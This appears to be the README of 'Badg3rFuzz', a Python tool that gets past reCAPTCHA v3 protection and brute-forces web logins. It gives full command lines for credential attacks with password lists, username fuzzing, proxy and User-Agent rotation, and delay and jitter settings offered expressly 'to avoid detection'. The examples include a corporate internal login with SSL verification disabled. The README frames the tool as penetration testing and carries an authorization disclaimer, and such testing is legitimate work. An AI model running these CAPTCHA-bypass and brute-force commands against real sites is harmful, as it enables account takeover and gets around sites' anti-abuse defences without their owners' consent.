# 🦡 Badg3rFuzz

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║        ██████╗  █████╗ ██████╗  ██████╗ ██████╗ ██████╗                      ║
║        ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ╚════██╗██╔══██╗                     ║
║        ██████╔╝███████║██║  ██║██║  ███╗ █████╔╝██████╔╝                     ║
║        ██╔══██╗██╔══██║██║  ██║██║   ██║ ╚═══██╗██╔══██╗                     ║
║        ██████╔╝██║  ██║██████╔╝╚██████╔╝██████╔╝██║  ██║                     ║
║        ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝                     ║
║                                                                              ║
║        ███████╗██╗   ██╗███████╗███████╗                                     ║
║        ██╔════╝██║   ██║╚══███╔╝╚══███╔╝                                     ║
║        █████╗  ██║   ██║  ███╔╝   ███╔╝                                      ║
║        ██╔══╝  ██║   ██║ ███╔╝   ███╔╝                                       ║
║        ██║     ╚██████╔╝███████╗███████╗                                     ║
║        ╚═╝      ╚═════╝ ╚══════╝╚══════╝                                     ║
║                                                                              ║
║                  🦡 Badg3rFuzz - Advanced Fuzzing & Brute Force Tool 🦡     ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

**Badg3rFuzz** is a professional cybersecurity auditing tool designed for penetration testing and security assessments of web applications protected with reCAPTCHA v3. It combines intelligent automation, multi-layer detection algorithms, and advanced features for comprehensive security testing.

---

## 🔥 Key Features

### Core Capabilities
* **reCAPTCHA v3 Bypass**: Automated token generation with `site-key` + `action` support
* **Multi-threaded Architecture**: High-performance parallel processing for maximum efficiency
* **Intelligent Success Detection**: Multi-layer analysis including content patterns, HTTP codes, redirects, and session cookies
* **Advanced Fuzzing Engine**: Multiple fuzzer types with configurable parameters
* **Proxy Integration**: Support for single proxies and proxy rotation from files
* **SSL/TLS Flexibility**: Custom CA certificates and SSL verification options

### Professional Features
* **Smart Pattern Recognition**: Configurable success/fail indicators with built-in common patterns
* **Rate Limiting & Stealth**: Configurable delays, jitter, and User-Agent rotation
* **Graceful Shutdown**: Clean resource management with proper signal handling
* **Comprehensive Logging**: Detailed attack logs with timestamps and results
* **Real-time Progress**: Live progress bar with ETA and performance metrics
* **WebDriver Flexibility**: Support for both Firefox (recommended) and Chrome

### Security & Compliance
* **Professional Use**: Designed for authorized penetration testing and security audits
* **Resource Management**: Automatic cleanup of temporary files and WebDriver instances
* **Error Handling**: Robust exception handling and recovery mechanisms

---

## 💻 Requirements and Compatibility

### System Requirements
* **Python**: 3.7+ (tested up to 3.11)
* **Operating Systems**: Windows, Linux, macOS
* **Memory**: Minimum 2GB RAM (4GB+ recommended for large wordlists)

### Browser Requirements
* **Firefox (Recommended)**:
  - Windows: Download from [https://mozilla.org/firefox](https://mozilla.org/firefox)
  - Linux: `sudo apt install firefox` or `sudo yum install firefox`
  - macOS: Download from Mozilla website
  - **Critical**: Place `geckodriver.exe` in the same directory as the script

* **Chrome (Alternative)**:
  - Install Google Chrome from [https://google.com/chrome](https://google.com/chrome)
  - WebDriver automatically managed via `webdriver-manager`

### Python Dependencies
```bash
pip install -r requirements.txt
```

### WebDriver Setup
- **Firefox**: Download `geckodriver` from [GitHub Releases](https://github.com/mozilla/geckodriver/releases)
- **Chrome**: Automatically handled by `webdriver-manager`

---

## 🚀 Basic Usage

### Simple Brute Force Attack
```bash
python badg3rfuzz.py \
  --site-key 6LfKj9EpAAAAAP8xQ7R2vN5mT6wU3bY8zC1dE4fG \
  --captcha-action login \
  --login-url https://target.com/login \
  --post-url https://target.com/api/auth \
  --user-file users.txt \
  --pass-file passwords.txt \
  --threads 10 \
  --stop-on-success
```

### Quick Username Fuzzing
```bash
python badg3rfuzz.py \
  --site-key YOUR_SITE_KEY \
  --captcha-action submit_form \
  --login-url https://target.com/auth \
  --post-url https://target.com/login \
  --user-fuzz digits:6:8:500 \
  --pass-file common-passwords.txt \
  --threads 15
```

---

## ⚙️ Advanced Usage Examples

### Professional Security Assessment
```bash
python badg3rfuzz.py \
  --site-key 6LfKj9EpAAAAAP8xQ7R2vN5mT6wU3bY8zC1dE4fG \
  --captcha-action login_attempt \
  --login-url https://secure.example.com/auth \
  --post-url https://secure.example.com/api/authenticate \
  --user-file usernames.txt \
  --pass-file rockyou.txt \
  --threads 8 \
  --webdriver chrome \
  --success-indicators "dashboard" "welcome" "profile" \
  --fail-indicators "invalid" "denied" "blocked" \
  --success-codes 200 302 \
  --delay 0.5 \
  --jitter 1.0 \
  --proxy-file proxies.txt \
  --user-agents-file user-agents.txt \
  --origin-url https://secure.example.com \
  --stop-on-success \
  --verbose
```

### Stealth Mode with SSL Bypass
```bash
python badg3rfuzz.py \
  --site-key 6LfKj9EpAAAAAP8xQ7R2vN5mT6wU3bY8zC1dE4fG \
  --captcha-action auth \
  --login-url https://internal.corp.com/login \
  --post-url https://internal.corp.com/api/login \
  --user-fuzz mix:8:12:200 \
  --pass-file passwords.txt \
  --threads 5 \
  --delay 2.0 \
  --jitter 3.0 \
  --disable-ssl-verify \
  --proxy http://proxy.corp.com:8080 \
  --user-agents-file browsers.txt \
  --no-banner
```

### Custom CA Certificate Environment
```bash
python badg3rfuzz.py \
  --site-key 6LfKj9EpAAAAAP8xQ7R2vN5mT6wU3bY8zC1dE4fG \
  --captcha-action login \
  --login-url https://private.company.com/auth \
  --post-url https://private.company.com/login \
  --user-file employees.txt \
  --pass-file company-passwords.txt \
  --ca-cert /path/to/company-ca.crt \
  --threads 3 \
  --delay 1.0 \
  --verbose
```

---

## 📋 Complete Parameters Reference

### Required Parameters
| Parameter           | Description                                                                | Example                              |
| ------------------- | -------------------------------------------------------------------------- | ------------------------------------ |
| `--site-key`        | Public reCAPTCHA key for token generation                                 | `6LfKj9EpAAAAAP8xQ7R2vN5mT6wU3bY8zC1dE4fG` |
| `--captcha-action`  | reCAPTCHA action parameter                                                 | `login`, `submit_form`, `authenticate` |
| `--login-url`       | URL where reCAPTCHA widget is loaded                                      | `https://target.com/login`           |
| `--post-url`        | Endpoint receiving authentication POST requests                            | `https://target.com/api/auth`        |

### Authentication Sources (Choose One)
| Parameter      | Description                                                    | Format                              |
| -------------- | -------------------------------------------------------------- | ----------------------------------- |
| `--user-file`  | File with usernames (one per line)                            | Text file                           |
| `--user-fuzz`  | Generate usernames automatically                               | `type:min_len:max_len:count`        |
| `--pass-file`  | File with passwords (one per line)                            | Text file                           |

### Performance & Threading
| Parameter           | Description                                       | Default  | Range        |
| ------------------- | ------------------------------------------------- | -------- | ------------ |
| `--threads`         | Number of concurrent attack threads              | 5        | 1-50         |
| `--delay`           | Base delay between requests (seconds)            | 0        | 0.0-60.0     |
| `--jitter`          | Random delay variation (seconds)                 | 0        | 0.0-30.0     |
| `--proxy-timeout`   | Timeout for proxy connections                    | 20       | 5-120        |

### Detection & Analysis
| Parameter              | Description                                           | Default    | Example                        |
| ---------------------- | ----------------------------------------------------- | ---------- | ------------------------------ |
| `--success-indicators` | Custom success patterns (case insensitive)           | Built-in   | `"dashboard" "welcome"`        |
| `--fail-indicators`    | Custom failure patterns (case insensitive)           | Built-in   | `"invalid" "denied"`           |
| `--success-codes`      | HTTP codes indicating success                         | 302        | `200 302 201`                  |
| `--check-cookies`      | Analyze session cookies as success indicator          | Enabled    | `--check-cookies`              |

### Network & Security
| Parameter              | Description                                           | Default    | Example                        |
| ---------------------- | ----------------------------------------------------- | ---------- | ------------------------------ |
| `--proxy`              | Single proxy for all requests                        | None       | `http://proxy:8080`            |
| `--proxy-file`         | File containing proxy list                            | None       | `proxies.txt`                  |
| `--user-agents-file`   | User-Agent rotation file                              | Built-in   | `user-agents.txt`              |
| `--disable-ssl-verify` | Disable SSL certificate verification                  | Enabled    | `--disable-ssl-verify`         |
| `--ca-cert`            | Custom CA certificate file                            | None       | `/path/to/ca.crt`              |
| `--origin-url`         | Custom Origin header URL                              | Auto       | `https://target.com`           |

### Execution Control
| Parameter           | Description                                           | Default      |
| ------------------- | ----------------------------------------------------- | ------------ |
| `--stop-on-success` | Stop execution on first valid credentials            | Continue     |
| `--webdriver`       | WebDriver engine: `firefox` or `chrome`              | firefox      |
| `--verbose`         | Enable detailed debug output                          | Quiet        |
| `--no-banner`       | Disable ASCII art banner                              | Show banner  |

---

## 🎯 User Fuzzer Configuration

### Fuzzer Types
Configure automatic username generation with `--user-fuzz type:min_len:max_len:count`:

| Type        | Character Set                                | Use Case                    | Example              |
| ----------- | -------------------------------------------- | --------------------------- | -------------------- |
| `digits`    | 0-9                                          | Numeric IDs, employee numbers | `digits:6:6:100`     |
| `digits+`   | 1-9 (no leading zeros)                      | Natural numbers, IDs        | `digits+:4:8:50`     |
| `letters`   | a-z, A-Z                                     | Alphabetic usernames        | `letters:5:10:200`   |
| `mix`       | a-z, A-Z, 0-9                                | Alphanumeric combinations   | `mix:8:12:500`       |
| `strong`    | a-z, A-Z, 0-9, punctuation                   | Complex usernames          | `strong:10:16:100`   |

### Practical Examples
```bash
# Generate 1000 employee ID variations (6 digits)
--user-fuzz digits:6:6:1000

# Create 500 mixed usernames (8-12 chars) for general testing
--user-fuzz mix:8:12:500

# Generate 100 complex usernames with special characters
--user-fuzz strong:10:15:100

# Natural number sequences (no leading zeros)
--user-fuzz digits+:4:8:200
```

---

## 🌐 Proxy Integration

### Single Proxy
```bash
# HTTP Proxy
--proxy http://proxy.company.com:8080

# Authenticated Proxy
--proxy http://user:pass@proxy.server.com:3128

# SOCKS Proxy
--proxy socks5://127.0.0.1:9050
```

### Proxy Rotation
Create `proxies.txt`:
```
http://proxy1.server.com:8080
http://user:pass@proxy2.server.com:3128
socks5://proxy3.server.com:1080
# Comments supported
http://proxy4.server.com:8080
```

Usage:
```bash
--proxy-file proxies.txt --proxy-timeout 15
```

---

## 🔍 Success Detection Engine

Badg3rFuzz employs a sophisticated multi-layer detection system:

### Layer 1: Content Analysis (Highest Priority)
- **Failure Patterns**: Detected first to avoid false positives
- **Success Patterns**: Comprehensive text matching
- **Built-in Patterns**: Common success/failure indicators
- **Custom Patterns**: User-defined via `--success-indicators` and `--fail-indicators`

### Layer 2: HTTP Response Analysis
- **Redirect Detection**: Success patterns in redirect URLs
- **Status Codes**: Configurable success codes via `--success-codes`
- **JSON Response**: Automatic parsing of API responses

### Layer 3: Session Management
- **Cookie Analysis**: Detection of authentication cookies
- **Pattern Matching**: Common session cookie names (`session`, `auth`, `token`, etc.)

### Layer 4: Advanced Indicators
- **Response Headers**: Authentication-related headers
- **Content-Length**: Significant changes indicating different pages
- **Response Time**: Anomaly detection for different response patterns

---

## 📊 Output and Logging

### Console Output
```
🦡 Badg3rFuzz v1.0
Start: 26-07-2025 15:30:45

[>] Initializing Badg3rFuzz modules...
[>] Loading fuzzing payloads and brute force wordlists...
[>] 2000 combo prepares.
[>] 15 proxies loaded
[>] Ready to fuzz and bruteforce your targets! 🦡💥
[>] Starting 10 threads...
[>] Fuzzing in progress...

[==============================] 1247/2000 (62.35%) | ETA: 8.2s
[+] Attempt: admin:password123
[+] Valid Login Found! admin:password123

[✔] Finished Attacks. Total: 1248
⌛ Finished: 26-07-2025 15:33:42 (duration 0:02:57)
```

### Log Files
- **Filename**: `fuzzlog-DD-MM-YYYY_HH-MM-SS.log`
- **Format**: Structured logging with timestamps
- **Content**: All attempts with detailed results

Example log content:
```
SUCCESS: admin:password123
[-] FAIL: user1:123456
[-] FAIL: test:password
SUCCESS: service:P@ssw0rd!
```

### Verbose Mode
Enable with `--verbose` for detailed debugging:
- HTTP request/response details
- Header information
- JSON response parsing
- Success detection analysis
- WebDriver operations

---

## 🛠️ Installation and Setup

### Quick Setup
```bash
# Clone repository
git clone https://github.com/yourusername/badg3rfuzz.git
cd badg3rfuzz

# Install dependencies
pip install -r requirements.txt

# Download geckodriver (Firefox users)
# Place geckodriver.exe in the script directory
```

### WebDriver Configuration

#### Firefox Setup (Recommended)
1. **Install Firefox**: Download from [Mozilla](https://mozilla.org/firefox)
2. **Download GeckoDriver**:
   ```bash
   # Linux/macOS
   wget https://github.com/mozilla/geckodriver/releases/latest/download/geckodriver-v0.33.0-linux64.tar.gz
   tar -xzf geckodriver-v0.33.0-linux64.tar.gz
   chmod +x geckodriver
   ```
   
   **Windows**: Download `.zip` and extract `geckodriver.exe`

3. **Placement**: Put `geckodriver` in the same directory as `badg3rfuzz.py`

#### Chrome Setup (Alternative)
- Install Google Chrome
- No manual WebDriver setup required
- Use `--webdriver chrome`

### File Structure
```
badg3rfuzz/
├── badg3rfuzz.py          # Main script
├── geckodriver            # Firefox WebDriver (Linux/macOS)
├── geckodriver.exe        # Firefox WebDriver (Windows)
├── requirements.txt       # Python dependencies
├── README.md              # This file
├── wordlists/             # Optional directory
│   ├── usernames.txt
│   ├── passwords.txt
│   ├── user-agents.txt
│   └── proxies.txt
└── logs/                  # Auto-created for logs
```

---

## 🔧 Troubleshooting

### Common Issues and Solutions

#### WebDriver Problems
**Problem**: `geckodriver.exe not found`
```bash
# Solution: Download and place in script directory
wget https://github.com/mozilla/geckodriver/releases/latest/download/geckodriver-v0.33.0-linux64.tar.gz
```

**Problem**: Browser windows appear despite headless mode
```bash
# Solution: Use Chrome or update Firefox
python badg3rfuzz.py --webdriver chrome [other options]
```

#### Network Issues
**Problem**: Connection timeouts with proxies
```bash
# Solution: Increase timeout and reduce threads
--proxy-timeout 30 --threads 3
```

**Problem**: SSL certificate errors
```bash
# Solution: Disable SSL verification or use custom CA
--disable-ssl-verify
# OR
--ca-cert /path/to/company-ca.crt
```

#### Performance Issues
**Problem**: High memory usage
```bash
# Solution: Reduce threads and add delays
--threads 5 --delay 1.0 --jitter 0.5
```

**Problem**: Too many failed connections
```bash
# Solution: Add rate limiting
--delay 2.0 --jitter 1.0 --threads 3
```

#### Detection Issues
**Problem**: False negatives (missing valid credentials)
```bash
# Solution: Customize success patterns
--success-indicators "welcome" "dashboard" "home" --verbose
```

**Problem**: False positives
```bash
# Solution: Add failure patterns
--fail-indicators "error" "invalid" "denied" "blocked"
```

### Debug Mode
Enable maximum verbosity for troubleshooting:
```bash
python badg3rfuzz.py [options] --verbose --threads 1 --delay 2.0
```

---

## 📈 Performance Optimization

### Threading Guidelines
- **Small targets**: 3-5 threads
- **Medium targets**: 8-15 threads  
- **Large targets**: 15-25 threads
- **Proxy usage**: Reduce by 50%

### Memory Management
```bash
# For large wordlists (>100k entries)
--threads 5 --delay 0.5

# For limited memory systems
--threads 3 --delay 1.0
```

### Network Optimization
```bash
# High-latency networks
--proxy-timeout 30 --delay 1.0

# Low-bandwidth connections
--threads 3 --delay 2.0 --jitter 1.0
```

### Stealth Recommendations
```bash
# Avoid detection
--delay 3.0 --jitter 2.0 --threads 2 --user-agents-file ua.txt
```

---

## 🚨 Advanced Security Features

### SSL/TLS Configuration
```bash
# Corporate environments with custom CAs
--ca-cert /etc/ssl/certs/company-ca.crt

# Self-signed certificates (testing only)
--disable-ssl-verify

# Convert DER to PEM (automatic)
# Tool automatically handles DER certificates
```

### Proxy Authentication
```bash
# Basic authentication
--proxy http://username:password@proxy.company.com:8080

# NTLM/Kerberos (system-configured)
--proxy http://proxy.company.com:8080
```

### User-Agent Rotation
Create `user-agents.txt`:
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
```

Usage:
```bash
--user-agents-file user-agents.txt
```

---

## 📋 Professional Use Cases

### Penetration Testing
```bash
# External assessment
python badg3rfuzz.py \
  --site-key TARGET_SITE_KEY \
  --captcha-action login \
  --login-url https://target.com/login \
  --post-url https://target.com/api/auth \
  --user-file users.txt \
  --pass-file passwords.txt \
  --threads 10 \
  --stop-on-success \
  --proxy-file proxies.txt \
  --delay 1.0 \
  --verbose
```

### Internal Security Assessment
```bash
# Internal network testing
python badg3rfuzz.py \
  --site-key INTERNAL_SITE_KEY \
  --captcha-action authenticate \
  --login-url https://internal.company.com/auth \
  --post-url https://internal.company.com/login \
  --user-file employees.txt \
  --pass-file common-passwords.txt \
  --ca-cert /etc/ssl/company-ca.crt \
  --threads 5 \
  --delay 2.0 \
  --success-indicators "welcome" "dashboard"
```

### Compliance Testing
```bash
# Password policy validation
python badg3rfuzz.py \
  --site-key COMPLIANCE_SITE_KEY \
  --captcha-action test \
  --login-url https://compliance.site.com/test \
  --post-url https://compliance.site.com/validate \
  --user-fuzz digits:8:8:100 \
  --pass-file weak-passwords.txt \
  --threads 3 \
  --delay 3.0 \
  --stop-on-success \
  --verbose
```

---

## ⚖️ Legal and Ethical Guidelines

### Authorization Requirements
**Before using Badg3rFuzz, ensure you have:**
- ✅ **Written authorization** from the system owner
- ✅ **Clear scope definition** of testing boundaries  
- ✅ **Legal compliance** with local and international laws
- ✅ **Proper documentation** of testing activities
- ✅ **Incident response plan** for discovered vulnerabilities

### Responsible Disclosure
1. **Document findings** professionally
2. **Report vulnerabilities** to appropriate contacts
3. **Provide remediation guidance** when possible
4. **Respect confidentiality** agreements
5. **Follow coordinated disclosure** timelines

### Professional Standards
- Use only for legitimate security testing
- Respect rate limits and system stability
- Minimize impact on production systems
- Document all testing activities
- Maintain client confidentiality

### Legal Disclaimer
```
This tool is intended EXCLUSIVELY for authorized security testing and 
educational purposes. Users must:

- Obtain explicit written permission before testing any system
- Comply with all applicable laws and regulations
- Use the tool responsibly and ethically
- Respect system owners' terms of service

The author disclaims all responsibility for misuse, damage, or legal 
consequences resulting from unauthorized use of this tool.
```

---

## 🔄 Updates and Versioning

### Current Version: v1.0

### Recent Improvements
- ✅ Multi-layer success detection engine
- ✅ Proxy rotation and authentication
- ✅ SSL/TLS flexibility with custom CAs
- ✅ Advanced rate limiting and stealth features
- ✅ Robust error handling and cleanup
- ✅ Professional logging and reporting

### Roadmap
- [ ] **v1.1**: GUI interface for easier operation
- [ ] **v1.2**: Advanced reporting with JSON/XML output
- [ ] **v1.3**: Machine learning-based success detection
- [ ] **v1.4**: Plugin architecture for custom modules
- [ ] **v1.5**: Distributed testing across multiple machines

---

## 📞 Support and Community

### Getting Help
- **Issues**: [GitHub Issues](https://github.com/tracel3ss/badg3rfuzz/issues)
- **Discussions**: [GitHub Discussions](https://github.com/tracel3ss/badg3rfuzz/discussions)

### Contributing
Contributions welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Submit a pull request with tests
4. Follow coding standards

### Professional Services
For professional security assessments and custom tool development, contact the author.

---

## ☕ Support the Project

If Badg3rFuzz helps with your security work, consider supporting development:

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/X8X61IO019)

Your support helps maintain and improve professional security tools.

---

## 📋 Updated Requirements

### requirements.txt
```
requests>=2.25.0
selenium>=4.15.0
webdriver-manager>=4.0.0
```

### Installation
```bash
pip install -r requirements.txt
```

---

## 🏆 Acknowledgments

- **Selenium Team**: For robust WebDriver automation
- **reCAPTCHA Research Community**: For insights into CAPTCHA mechanisms
- **Security Community**: For feedback and feature requests
- **Beta Testers**: Professional penetration testers who provided feedback

---

**Badg3rFuzz v1.0** - Professional cybersecurity auditing made efficient 🦡💥

*Developed by cybersecurity professionals, for cybersecurity professionals.*
